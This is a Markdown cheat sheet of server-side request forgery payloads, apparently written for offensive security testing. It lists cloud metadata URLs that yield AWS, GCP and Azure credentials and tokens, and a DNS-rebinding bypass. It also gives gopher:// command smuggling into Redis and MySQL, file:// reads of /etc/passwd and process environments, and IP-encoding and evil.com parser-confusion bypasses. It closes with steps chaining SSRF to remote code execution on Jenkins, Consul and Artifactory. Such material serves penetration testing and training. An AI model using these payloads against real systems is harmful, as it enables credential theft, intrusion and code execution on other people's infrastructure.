# SSRF: Server-Side Request Forgery

## Cloud Metadata Exploitation

### AWS IMDSv1 (No Token Required)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

### AWS IMDSv2 Bypass
IMDSv2 requires a token header. Bypass approaches:
```bash
# SSRF via AWS API endpoint
http://instance-data.<region>.compute.amazonaws.com/
# DNS rebinding attack
# 1. Register domain with short TTL
# 2. First resolution → real IP, passes checks
# 3. Second resolution → 169.254.169.254, reads metadata
```

### GCP Metadata
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires Metadata-Flavor: Google header
```

### Azure Metadata
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
# Requires Metadata: true header
http://169.254.169.254/metadata/authentication?api=2015-01-01&header=01
```

## SSRF to Internal Network Pivot

### Common Internal Endpoints
```bash
# Internal services
http://localhost:9200/                    # Elasticsearch
http://localhost:6379/                    # Redis (no auth typically)
http://localhost:27017/                   # MongoDB
http://localhost:5432/                    # PostgreSQL probing
http://localhost:8080/                    # Common admin panel
http://localhost:5000/                    # Flask debug
# Kubernetes
http://kubernetes.default.svc/
http://10.0.0.1/                          # Default K8s gateway
http://metadata.google.internal/          # GKE metadata
```

### Blind SSRF Detection
```bash
# DNS-based detection (works even when HTTP is blocked)
# Use Burp Collaborator or interactsh
http://collaborator.oastify.com/
# Use HTTPS to bypass allowlists that only permit specific protocols
https://collaborator.oastify.com/
```

## SSRF Protocol Smuggling

```bash
# Redirect-based SSRF (URL redirects to internal)
# DNS rebinding
# Using gopher:// protocol for TCP smuggling (gopher sends raw bytes)
gopher://internal:6379/_*3%0d%0a...   # Redis command over gopher
gopher://internal:3306/_...           # MySQL over gopher
# file:// protocol bypass
file:///etc/passwd
file:////proc/1/environ
```

## WAF Bypass for SSRF

```bash
# URL parsing differentials
http://127.1/                           # Short-form IP
http://0/                               # Localhost shorthand
http://2130706433/                      # Decimal IP (127.0.0.1 = 2130706433)
http://0x7f000001/                      # Hex IP
http://0177.0.0.1/                      # Octal IP
http://127.0.0.1:80\@evil.com/         # Credential confusion
http://evil.com#@127.0.0.1/             # Fragment confusion
# DNS parser bypass
http://localhost.evil.com/              # Subdomain confusion
http://127.0.0.1.nip.io/               # Wildcard DNS
```

## SSRF to RCE Chain

1. SSRF to internal service (no auth needed)
2. Internal service = Jenkins/Artifactory/Consul with API endpoints
3. Jenkins: POST `/script` with Groovy script execution → RCE
4. Consul: POST `/v1/agent/service/register` with service exec check → RCE
5. Artifactory: PUT deploy artifact → write JSP file → access it → RCE
